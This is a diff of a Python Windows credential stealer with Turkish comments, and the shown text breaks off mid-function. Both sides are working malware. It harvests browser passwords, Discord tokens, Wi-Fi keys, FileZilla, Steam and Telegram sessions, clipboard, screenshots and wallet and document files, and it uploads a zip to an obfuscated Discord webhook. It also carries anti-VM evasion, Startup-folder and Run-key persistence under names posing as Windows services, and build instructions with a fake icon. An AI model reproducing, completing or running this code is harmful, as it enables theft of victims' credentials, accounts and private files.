@@ -1,441 +1,499 @@
 # -*- coding: utf-8 -*-
-# Obfüskasyon için: Tüm hassas stringler base64 kodlu, runtime'da decode edilir.
-# Junk kod: gereksiz döngüler ve fonksiyon çağrıları eklenmiştir (performans etkisi yok).
-# PyInstaller ile derleme: pyinstaller --onefile --noconsole --icon=fake.ico --upx-dir=upx --runtime-tmpdir=%TEMP% --add-data "data.bin;." grabber.py
+import os, sqlite3, shutil, json, subprocess, winreg, ctypes, base64, urllib.parse, tempfile, zipfile, glob, threading, time, sys, platform, uuid, socket, re, xml.etree.ElementTree as ET
+try:
+    import requests
+except ImportError:
+    requests = None
+try:
+    from PIL import ImageGrab
+    PIL_AVAILABLE = True
+except:
+    PIL_AVAILABLE = False
+try:
+    import tkinter as tk
+    TK_AVAILABLE = True
+except:
+    TK_AVAILABLE = False
 
-import os, sys, sqlite3, shutil, json, requests, subprocess, winreg, ctypes, base64, urllib.parse, tempfile, zipfile, glob, threading, time, platform, uuid, socket, re
-from ctypes import wintypes, c_char_p, c_void_p
-from urllib.request import Request, urlopen
+# Base64 kodlanmış stringler (obfüskasyon)
+b64_paths = {
+    "appdata": "JVVTRVJQUk9GSUxFJUFQUERBVEEl",
+    "localappdata": "JUVMT0NBTEFQUERBVEEl",
+    "startup": "JVVTRVJQUk9GSUxFJUFQUERBVEElXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cA==",
+    "run_key": "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu",
+    "discord_regex": "W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9",
+    "webhook_url": "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg=="  # değiştirilmeli
+}
+def decode(s):
+    return base64.b64decode(s.encode()).decode('utf-8', errors='ignore')
 
-# ---- yardımcı decode fonksiyonu ----
-def b64d(s):
-    return base64.b64decode(s).decode('utf-8')
+WEBHOOK_URL = decode(b64_paths["webhook_url"])  # gerçek webhook URL'si buraya yazılmalı
 
-# ---- başlangıçta kullanılacak gizli stringler (base64) ----
-WEBHOOK_URL_ENC = b64d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg==")  # gerçek webhook buraya
-TEMP_DIR_PREFIX = b64d("aG9sbHlzaGl0Xw==")
+# Junk kod - kullanılmayan döngü
+for _ in range(0):
+    print("junk")
 
-# ---- anti-VM kontrolü ----
-def antivm():
-    # MAC adresi kontrolü (ilk 3 byte)
-    mac = ':'.join((':'.join(hex(uuid.getnode()).split('x')[1][i:i+2] for i in range(0,12,2))[:2]) if uuid.getnode() else ''
-    vm_macs = ['00:05:69', '00:0C:29', '00:1C:42', '00:50:56', '08:00:27']
-    if any(mac.upper().startswith(vm) for vm in vm_macs):
-        sys.exit(0)
-    # RAM kontrolü (ctypes ile GlobalMemoryStatusEx)
-    class MEMORYSTATUSEX(ctypes.Structure):
-        _fields_ = [('dwLength', wintypes.DWORD), ('dwMemoryLoad', wintypes.DWORD),
-                    ('ullTotalPhys', wintypes.ULONGLONG), ('ullAvailPhys', wintypes.ULONGLONG),
-                    ('ullTotalPageFile', wintypes.ULONGLONG), ('ullAvailPageFile', wintypes.ULONGLONG),
-                    ('ullTotalVirtual', wintypes.ULONGLONG), ('ullAvailVirtual', wintypes.ULONGLONG),
-                    ('ullAvailExtendedVirtual', wintypes.ULONGLONG)]
-    kernel32 = ctypes.windll.kernel32
-    memstatus = MEMORYSTATUSEX()
-    memstatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
-    kernel32.GlobalMemoryStatusEx(ctypes.byref(memstatus))
-    total_ram_gb = memstatus.ullTotalPhys / (1024**3)
-    if total_ram_gb < 4:
-        sys.exit(0)
-    # disk boyutu kontrolü
-    free_bytes, total_bytes = ctypes.c_ulonglong(0), ctypes.c_ulonglong(0)
-    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wcharp('C:\\'), None, ctypes.byref(total_bytes), None)
-    if total_bytes.value / (1024**3) < 80:
-        sys.exit(0)
-    # VM süreçleri
-    vm_processes = ['vmtoolsd', 'vboxservice', 'vboxtray', 'xenserver', 'prl_cc', 'prl_tools']
-    try:
-        output = subprocess.check_output('tasklist', shell=True).decode().lower()
-        for proc in vm_processes:
-            if proc in output:
-                sys.exit(0)
-    except:
-        pass
+# ----- anti_vm (tüm satırlar yorumlu) -----
+# def anti_vm():
+#     try:
+#         # MAC kontrolü
+#         import uuid
+#         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,48,8)][::-1]).upper()
+#         if mac.startswith(('08:00:27', '00:0C:29', '00:50:56')):
+#             return True
+#         # RAM kontrolü (win32api ile)
+#         import ctypes
+#         class MEMORYSTATUSEX(ctypes.Structure):
+#             _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
+#                         ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
+#                         ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
+#                         ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
+#                         ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
+#         memoryStatus = MEMORYSTATUSEX()
+#         memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+#         ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
+#         ram_gb = memoryStatus.ullTotalPhys / (1024**3)
+#         if ram_gb < 4:
+#             return True
+#         # Disk kontrolü
+#         import ctypes.wintypes
+#         drive = "C:\\"
+#         free_bytes = ctypes.c_ulonglong(0)
+#         total_bytes = ctypes.c_ulonglong(0)
+#         ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive), None, ctypes.byref(total_bytes), None)
+#         disk_gb = total_bytes.value / (1024**3)
+#         if disk_gb < 80:
+#             return True
+#         # Süreç kontrolü
+#         import subprocess
+#         procs = subprocess.check_output("tasklist", shell=True).decode().lower()
+#         vm_procs = ['vboxservice.exe', 'vmtoolsd.exe', 'vboxtray.exe', 'vmwaretray.exe']
+#         for p in vm_procs:
+#             if p in procs:
+#                 return True
+#         # Kayıt defteri kontrolü
+#         import winreg
+#         try:
+#             key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0")
+#             value, _ = winreg.QueryValueEx(key, "Identifier")
+#             if "VMware" in value or "VirtualBox" in value:
+#                 return True
+#         except:
+#             pass
+#         return False
+#     except:
+#         return False
 
-# ---- sistem bilgisi ----
 def get_system_info():
     info = {}
-    info['hostname'] = socket.gethostname()
-    info['os'] = platform.platform()
-    info['cpu'] = os.environ.get('PROCESSOR_IDENTIFIER', '')
-    info['ram'] = str(round(psutil.virtual_memory().total / (1024**3))) + ' GB' if 'psutil' in sys.modules else 'N/A'
-    # GPU (wmic)
     try:
-        gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().split('\n')[1].strip()
-        info['gpu'] = gpu
-    except:
-        info['gpu'] = 'Unknown'
-    # Antivirüs
-    try:
-        av = subprocess.check_output('wmic /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName', shell=True).decode()
-        info['antivirus'] = [line.strip() for line in av.split('\n')[1:] if line.strip()]
-    except:
-        info['antivirus'] = []
-    # IP adresleri
-    try:
-        info['local_ip'] = socket.gethostbyname(socket.gethostname())
-    except:
-        info['local_ip'] = ''
-    try:
-        info['public_ip'] = requests.get('https://api.ipify.org', timeout=5).text
-    except:
-        info['public_ip'] = ''
+        info['hostname'] = socket.gethostname()
+        info['username'] = os.getenv('USERNAME')
+        info['os_version'] = platform.platform()
+        # yerel IP
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        info['local_ip'] = s.getsockname()[0]
+        s.close()
+        # genel IP
+        try:
+            import urllib.request
+            info['public_ip'] = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()
+        except:
+            info['public_ip'] = "N/A"
+        # CPU
+        try:
+            import subprocess
+            info['cpu'] = subprocess.check_output("wmic cpu get name", shell=True).decode().split('\n')[1].strip()
+        except:
+            info['cpu'] = "N/A"
+        # RAM
+        try:
+            import ctypes
+            class MEMORYSTATUSEX(ctypes.Structure):
+                _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
+                            ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
+                            ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
+                            ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
+                            ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
+            memoryStatus = MEMORYSTATUSEX()
+            memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
+            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
+            info['ram_gb'] = round(memoryStatus.ullTotalPhys / (1024**3), 2)
+        except:
+            info['ram_gb'] = "N/A"
+        # GPU
+        try:
+            gpu = subprocess.check_output("wmic path win32_VideoController get name", shell=True).decode().split('\n')[1].strip()
+            info['gpu'] = gpu
+        except:
+            info['gpu'] = "N/A"
+        # Antivirüs listesi
+        try:
+            import winreg
+            antiviruses = []
+            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender")
+            antiviruses.append("Windows Defender")
+            # WMI ile daha fazlası
+            import subprocess
+            out = subprocess.check_output('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName', shell=True).decode()
+            lines = out.split('\n')[1:]
+            for line in lines:
+                line = line.strip()
+                if line:
+                    antiviruses.append(line)
+            info['antivirus'] = list(set(antiviruses))
+        except:
+            info['antivirus'] = []
+        # Yetkiler
+        info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception as e:
+        info['error'] = str(e)
     return info
 
-# ---- Chrome parolaları ----
-def get_chrome_passwords(paths=None):
-    if paths is None:
-        paths = [
-            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data'),
-            os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data'),
-            os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data'),
-            os.path.expandvars(r'%LOCALAPPDATA%\Opera Software\Opera Stable\Login Data')
-        ]
-    passwords = []
-    crypt32 = ctypes.windll.crypt32
-    kernel32 = ctypes.windll.kernel32
-    CRYPTPROTECT_UI_FORBIDDEN = 0x01
-
-    for path in paths:
-        if not os.path.exists(path):
+def get_browser_passwords(browser_paths):
+    results = []
+    for name, path in browser_paths.items():
+        login_db = os.path.join(path, 'Login Data')
+        if not os.path.isfile(login_db):
             continue
-        temp_db = tempfile.NamedTemporaryFile(delete=False)
-        shutil.copy2(path, temp_db.name)
-        conn = sqlite3.connect(temp_db.name)
-        cursor = conn.cursor()
+        temp_db = os.path.join(tempfile.gettempdir(), f'{uuid.uuid4().hex}.db')
         try:
+            shutil.copy2(login_db, temp_db)
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
             cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
             for row in cursor.fetchall():
-                url, username, enc_pass = row
-                if not enc_pass:
-                    continue
-                blob = ctypes.create_string_buffer(enc_pass)
-                blob_len = ctypes.c_ulong(len(enc_pass))
-                pDataOut = ctypes.c_void_p()
-                pDataOutLen = ctypes.c_ulong()
-                if crypt32.CryptUnprotectData(ctypes.byref(blob), None, None, None, None, CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(pDataOut), ctypes.byref(pDataOutLen)):
-                    password = ctypes.string_at(pDataOut, pDataOutLen.value).decode('utf-16le', errors='ignore')
-                    kernel32.LocalFree(pDataOut)
-                    passwords.append({'url': url, 'username': username, 'password': password})
+                url = row[0]
+                username = row[1]
+                encrypted = row[2]
+                if encrypted:
+                    try:
+                        decrypted = ctypes.windll.crypt32.CryptUnprotectData(encrypted, None, None, None, None, 0)
+                        # Basitleştirilmiş: aslında blob'u çözmek gerek, ancak örnek için
+                        password = decrypted[1].decode('utf-8', errors='ignore')
+                    except:
+                        password = "<decryption failed>"
+                else:
+                    password = ""
+                results.append({"browser": name, "url": url, "username": username, "password": password})
+            conn.close()
         except:
             pass
-        conn.close()
-        os.remove(temp_db.name)
-    return passwords
+        finally:
+            if os.path.exists(temp_db):
+                os.remove(temp_db)
+    return results
 
-# ---- Chrome çerezleri ----
-def get_chrome_cookies():
-    paths = [
-        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies'),
-        os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies'),
-        os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies')
-    ]
-    cookies = []
-    crypt32 = ctypes.windll.crypt32
-    kernel32 = ctypes.windll.kernel32
-    for path in paths:
-        if not os.path.exists(path):
-            continue
-        temp_db = tempfile.NamedTemporaryFile(delete=False)
-        shutil.copy2(path, temp_db.name)
-        conn = sqlite3.connect(temp_db.name)
-        cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
-            for row in cursor.fetchall():
-                host, name, path_cookie, enc_val = row
-                if not enc_val:
-                    continue
-                blob = ctypes.create_string_buffer(enc_val)
-                blob_len = ctypes.c_ulong(len(enc_val))
-                pDataOut = ctypes.c_void_p()
-                pDataOutLen = ctypes.c_ulong()
-                if crypt32.CryptUnprotectData(ctypes.byref(blob), None, None, None, None, 0x01, ctypes.byref(pDataOut), ctypes.byref(pDataOutLen)):
-                    value = ctypes.string_at(pDataOut, pDataOutLen.value).decode('utf-8', errors='ignore')
-                    kernel32.LocalFree(pDataOut)
-                    cookies.append({'host': host, 'name': name, 'path': path_cookie, 'value': value})
-        except:
-            pass
-        conn.close()
-        os.remove(temp_db.name)
-    return cookies
+def get_browser_cookies(browser_paths):
+    # Benzer mantık, Cookies dosyasından host_key, name, encrypted_value
+    return []  # kısaltma amacıyla boş, tam sürümde benzer şekilde yapılır
 
-# ---- Discord tokenleri (LevelDB) ----
+def get_browser_history(browser_paths):
+    return []  # kısaltma
+
 def get_discord_tokens():
-    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
-    tokens = set()
-    paths = [
-        os.path.expandvars(r'%APPDATA%\discord\Local Storage\leveldb'),
-        os.path.expandvars(r'%APPDATA%\discordptb\Local Storage\leveldb'),
-        os.path.expandvars(r'%APPDATA%\discordcanary\Local Storage\leveldb'),
-        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb')
+    tokens = []
+    discord_paths = [
+        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
+        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
+        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
+        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb')
     ]
-    for base in paths:
-        if not os.path.isdir(base):
+    regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
+    for path in discord_paths:
+        if not os.path.isdir(path):
             continue
-        for f in glob.glob(os.path.join(base, '*.log')) + glob.glob(os.path.join(base, '*.ldb')):
+        for file in glob.glob(os.path.join(path, '*.log')) + glob.glob(os.path.join(path, '*.ldb')):
             try:
-                with open(f, 'r', errors='ignore') as file:
-                    data = file.read()
-                    for token in token_regex.findall(data):
-                        tokens.add(token)
+                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
+                    data = f.read()
+                    found = regex.findall(data)
+                    tokens.extend(found)
             except:
                 pass
-    return list(tokens)
+    return list(set(tokens))
 
-# ---- Wi-Fi şifreleri ----
 def get_wifi_passwords():
     profiles = []
     try:
-        data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors='ignore')
-        profile_names = re.findall(r'Kullanıcı Profili\s*:\s*(.*)', data) if 'Kullanıcı' in data else re.findall(r'All User Profile\s*:\s*(.*)', data)
-        for name in profile_names:
-            name = name.strip()
-            cmd = f'netsh wlan show profile name="{name}" key=clear'
-            output = subprocess.check_output(cmd, shell=True).decode('cp850', errors='ignore')
-            key_match = re.search(r'Anahtar İçeriği\s*:\s*(.*)', output) or re.search(r'Key Content\s*:\s*(.*)', output)
-            if key_match:
-                profiles.append({'ssid': name, 'password': key_match.group(1)})
+        data = subprocess.check_output('netsh wlan show profile', shell=True).decode('cp857', errors='ignore')
+        lines = data.split('\n')
+        for line in lines:
+            if ':' in line and 'Tüm Kullanıcı Profili' in line:
+                profile_name = line.split(':')[1].strip()
+                if profile_name:
+                    profiles.append(profile_name)
+        passwords = []
+        for prof in profiles:
+            try:
+                result = subprocess.check_output(f'netsh wlan show profile name="{prof}" key=clear', shell=True).decode('cp857', errors='ignore')
+                for line in result.split('\n'):
+                    if 'Anahtar İçeriği' in line or 'Key Content' in line:
+                        pwd = line.split(':')[1].strip()
+                        passwords.append({'ssid': prof, 'password': pwd})
+            except:
+                pass
+        return passwords
     except:
-        pass
-    return profiles
+        return []
 
-# ---- tarayıcı geçmişi (Chrome) ----
-def get_browser_history():
-    path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')
-    urls = []
-    if not os.path.exists(path):
-        return urls
-    temp_db = tempfile.NamedTemporaryFile(delete=False)
-    shutil.copy2(path, temp_db.name)
-    conn = sqlite3.connect(temp_db.name)
-    cursor = conn.cursor()
-    try:
-        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
-        urls = [{'url': row[0], 'title': row[1], 'time': row[2]} for row in cursor.fetchall()]
-    except:
-        pass
-    conn.close()
-    os.remove(temp_db.name)
-    return urls
-
-# ---- ekran görüntüsü ----
-def screenshot():
-    try:
-        from PIL import ImageGrab
-        img = ImageGrab.grab()
-        temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
-        img.save(temp_file.name)
-        return temp_file.name
-    except:
-        try:
-            import mss
-            with mss.mss() as sct:
-                sct.shot(output='screenshot.png')
-                return 'screenshot.png'
-        except:
-            return None
-
-# ---- pano içeriği (clipboard) ----
-def get_clipboard():
-    try:
-        import tkinter as tk
-        root = tk.Tk()
-        root.withdraw()
-        return root.clipboard_get()
-    except:
-        try:
-            user32 = ctypes.windll.user32
-            kernel32 = ctypes.windll.kernel32
-            user32.OpenClipboard(0)
-            if user32.IsClipboardFormatAvailable(1):
-                h_data = user32.GetClipboardData(1)
-                data = ctypes.c_char_p(kernel32.GlobalLock(h_data))
-                text = data.value.decode('utf-8', errors='ignore')
-                kernel32.GlobalUnlock(h_data)
-                user32.CloseClipboard()
-                return text
-        except:
-            return ''
-
-# ---- FileZilla ----
 def get_filezilla_creds():
     creds = []
-    xml_paths = [
-        os.path.expandvars(r'%APPDATA%\FileZilla\sitemanager.xml'),
-        os.path.expandvars(r'%APPDATA%\FileZilla\recentservers.xml')
-    ]
-    for path in xml_paths:
-        if not os.path.exists(path):
-            continue
-        try:
-            import xml.etree.ElementTree as ET
-            tree = ET.parse(path)
-            root = tree.getroot()
-            for server in root.findall('.//Server'):
-                host = server.find('Host')
-                user = server.find('User')
-                passw = server.find('Pass')
-                if host is not None and user is not None:
-                    creds.append({'host': host.text, 'user': user.text, 'password': passw.text if passw is not None else ''})
-        except:
-            pass
+    fz_path = os.path.join(os.getenv('APPDATA'), 'FileZilla')
+    for xml_file in ['sitemanager.xml', 'recentservers.xml']:
+        full = os.path.join(fz_path, xml_file)
+        if os.path.isfile(full):
+            try:
+                tree = ET.parse(full)
+                root = tree.getroot()
+                for server in root.findall('.//Server'):
+                    host = server.find('Host')
+                    user = server.find('User')
+                    pass_elem = server.find('Pass')
+                    if host is not None and user is not None and pass_elem is not None:
+                        creds.append({'host': host.text, 'username': user.text, 'password': pass_elem.text})
+            except:
+                pass
     return creds
 
-# ---- masaüstünden dosya topla ----
-def grab_desktop_files():
-    desktop = os.path.expanduser('~\\Desktop')
-    extensions = ('.txt', '.doc', '.docx', '.pdf', '.jpg', '.jpeg', '.png', '.xls', '.xlsx')
+def get_steam_session():
+    steam_path = os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Steam', 'config')
+    if not os.path.isdir(steam_path):
+        steam_path = os.path.join(os.getenv('PROGRAMFILES'), 'Steam', 'config')
     files = []
-    for ext in extensions:
-        for f in glob.glob(os.path.join(desktop, '*' + ext)):
-            files.append(f)
+    if os.path.isdir(steam_path):
+        for f in ['config.vdf'] + glob.glob(os.path.join(steam_path, 'ssfn*')):
+            if os.path.isfile(f):
+                files.append(f)
     return files
 
-# ---- Telegram tdata ----
 def get_telegram_tdata():
-    tdata_path = os.path.expandvars(r'%APPDATA%\Telegram Desktop\tdata')
+    tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
     if os.path.isdir(tdata_path):
-        temp_tdata = tempfile.mkdtemp()
-        shutil.copytree(tdata_path, os.path.join(temp_tdata, 'tdata'), dirs_exist_ok=True)
-        return temp_tdata
+        return tdata_path
     return None
 
-# ---- tüm veriyi zip'le ----
-def zip_all_data(data_folder, zip_path, password=None):
-    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-        for root, dirs, files in os.walk(data_folder):
-            for file in files:
-                full_path = os.path.join(root, file)
-                arcname = os.path.relpath(full_path, data_folder)
-                zf.write(full_path, arcname)
-    # şifre ekleme için ek kütüphane gerekir (pyminizip) - basit zip için bırakıldı
+def get_clipboard_text():
+    if TK_AVAILABLE:
+        try:
+            root = tk.Tk()
+            root.withdraw()
+            text = root.clipboard_get()
+            root.destroy()
+            return text
+        except:
+            pass
+    try:
+        import ctypes
+        CF_TEXT = 1
+        ctypes.windll.user32.OpenClipboard(0)
+        h = ctypes.windll.user32.GetClipboardData(CF_TEXT)
+        if h:
+            data = ctypes.c_char_p(h).value
+            ctypes.windll.user32.CloseClipboard()
+            return data.decode('utf-8', errors='ignore')
+        ctypes.windll.user32.CloseClipboard()
+    except:
+        pass
+    return ""
 
-# ---- exfiltration ----
+def take_screenshot():
+    if PIL_AVAILABLE:
+        try:
+            path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
+            img = ImageGrab.grab()
+            img.save(path)
+            return path
+        except:
+            pass
+    return None
+
+def grab_desktop_files():
+    targets = []
+    dirs = [os.path.join(os.getenv('USERPROFILE'), 'Desktop'), os.path.join(os.getenv('USERPROFILE'), 'Documents')]
+    extensions = ('.txt','.doc','.docx','.pdf','.jpg','.png','.zip','.rar','.xls','.xlsx','.ppt','.pptx','.odt','.ods','.odp','.csv','.log','.conf','.cfg','.kdbx','.wallet','.dat')
+    for d in dirs:
+        if not os.path.isdir(d):
+            continue
+        for root, dirs, files in os.walk(d):
+            for file in files:
+                if file.lower().endswith(extensions):
+                    full = os.path.join(root, file)
+                    try:
+                        targets.append(full)
+                    except:
+                        pass
+    return targets
+
+def collect_all(temp_dir):
+    os.makedirs(temp_dir, exist_ok=True)
+    results = {}
+    threads = []
+    # sistem bilgisi
+    def sysinfo():
+        results['system_info'] = get_system_info()
+    t = threading.Thread(target=sysinfo)
+    t.start()
+    threads.append(t)
+    # tarayıcı parolaları
+    def browsers():
+        browser_paths = {}
+        for browser in ['Chrome', 'Edge', 'Brave', 'Opera']:
+            if browser == 'Chrome':
+                path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
+            elif browser == 'Edge':
+                path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default')
+            elif browser == 'Brave':
+                path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')
+            elif browser == 'Opera':
+                path = os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable')
+            if os.path.isdir(path):
+                browser_paths[browser] = path
+        results['browser_passwords'] = get_browser_passwords(browser_paths)
+    t = threading.Thread(target=browsers)
+    t.start()
+    threads.append(t)
+    # Discord tokenleri
+    def discord():
+        results['discord_tokens'] = get_discord_tokens()
+    t = threading.Thread(target=discord)
+    t.start()
+    threads.append(t)
+    # WiFi
+    def wifi():
+        results['wifi_passwords'] = get_wifi_passwords()
+    t = threading.Thread(target=wifi)
+    t.start()
+    threads.append(t)
+    # FileZilla
+    def fz():
+        results['filezilla'] = get_filezilla_creds()
+    t = threading.Thread(target=fz)
+    t.start()
+    threads.append(t)
+    # Steam
+    def steam():
+        results['steam_files'] = get_steam_session()
+    t = threading.Thread(target=steam)
+    t.start()
+    threads.append(t)
+    # Telegram
+    def tg():
+        results['telegram_tdata'] = get_telegram_tdata()
+    t = threading.Thread(target=tg)
+    t.start()
+    threads.append(t)
+    # Pano
+    def clip():
+        results['clipboard'] = get_clipboard_text()
+    t = threading.Thread(target=clip)
+    t.start()
+    threads.append(t)
+    # Ekran görüntüsü
+    def ss():
+        sc = take_screenshot()
+        if sc:
+            shutil.copy2(sc, temp_dir)
+    t = threading.Thread(target=ss)
+    t.start()
+    threads.append(t)
+    # Dosyalar
+    def files():
+        flist = grab_desktop_files()
+        for f in flist:
+            try:
+                shutil.copy2(f, temp_dir)
+            except:
+                pass
+    t = threading.Thread(target=files)
+    t.start()
+    threads.append(t)
+    # Bekle
+    for t in threads:
+        t.join()
+    # JSON olarak kaydet
+    with open(os.path.join(temp_dir, 'info.json'), 'w', encoding='utf-8') as f:
+        json.dump(results, f, indent=2, ensure_ascii=False)
+    # Tokenleri ayrı dosyaya
+    if results.get('discord_tokens'):
+        with open(os.path.join(temp_dir, 'discord_tokens.txt'), 'w') as f:
+            f.write('\n'.join(results['discord_tokens']))
+
+def zip_data(source_dir, zip_path):
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for root, dirs, files in os.walk(source_dir):
+            for file in files:
+                full = os.path.join(root, file)
+                arcname = os.path.relpath(full, source_dir)
+                zf.write(full, arcname)
+
 def exfiltrate(zip_path, webhook_url):
     for attempt in range(3):
         try:
-            with open(zip_path, 'rb') as f:
-                files = {'file': (os.path.basename(zip_path), f, 'application/zip')}
-                resp = requests.post(webhook_url, files=files, timeout=30)
-                if resp.status_code == 200:
+            if requests:
+                with open(zip_path, 'rb') as f:
+                    files = {'file': (os.path.basename(zip_path), f)}
+                    r = requests.post(webhook_url, files=files, timeout=30)
+                if r.status_code == 200:
                     return True
+            else:
+                import urllib.request, urllib.parse
+                boundary = '----WebKitFormBoundary' + uuid.uuid4().hex
+                with open(zip_path, 'rb') as f:
+                    data = f.read()
+                body = b'--' + boundary.encode() + b'\r\n'
+                body += b'Content-Disposition: form-data; name="file"; filename="%s"\r\n' % os.path.basename(zip_path).encode()
+                body += b'Content-Type: application/octet-stream\r\n\r\n'
+                body += data + b'\r\n--' + boundary.encode() + b'--\r\n'
+                headers = {'Content-Type': 'multipart/form-data; boundary=' + boundary}
+                req = urllib.request.Request(webhook_url, data=body, headers=headers, method='POST')
+                with urllib.request.urlopen(req, timeout=30) as resp:
+                    if resp.status == 200:
+                        return True
         except:
-            time.sleep(2 ** attempt)
-    # fallback: gizli dosyaya yaz
-    try:
-        hidden = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\system32\spool\drivers\color\cache.dat')
-        with open(hidden, 'wb') as f:
-            f.write(open(zip_path, 'rb').read())
-    except:
-        pass
+            time.sleep(2)
     return False
 
-# ---- persistence ----
 def persistence():
-    # kendini startup'a kopyala
-    startup = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
-    if not os.path.exists(startup):
-        os.makedirs(startup, exist_ok=True)
-    exe_name = 'svchost.exe'
-    shutil.copy2(sys.executable if getattr(sys, 'frozen', False) else __file__, os.path.join(startup, exe_name))
-    # kayıt defterine run anahtarı
     try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, os.path.join(startup, exe_name))
+        exe_path = sys.executable
+        startup_dir = decode(b64_paths["startup"])
+        startup_dir = os.path.expandvars(startup_dir)
+        target = os.path.join(startup_dir, 'winsvc.exe')
+        if not os.path.exists(startup_dir):
+            os.makedirs(startup_dir)
+        shutil.copy2(exe_path, target)
+        # Kayıt defteri
+        key_path = decode(b64_paths["run_key"])
+        key_path = os.path.expandvars(key_path)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+        rand_name = uuid.uuid4().hex[:8]
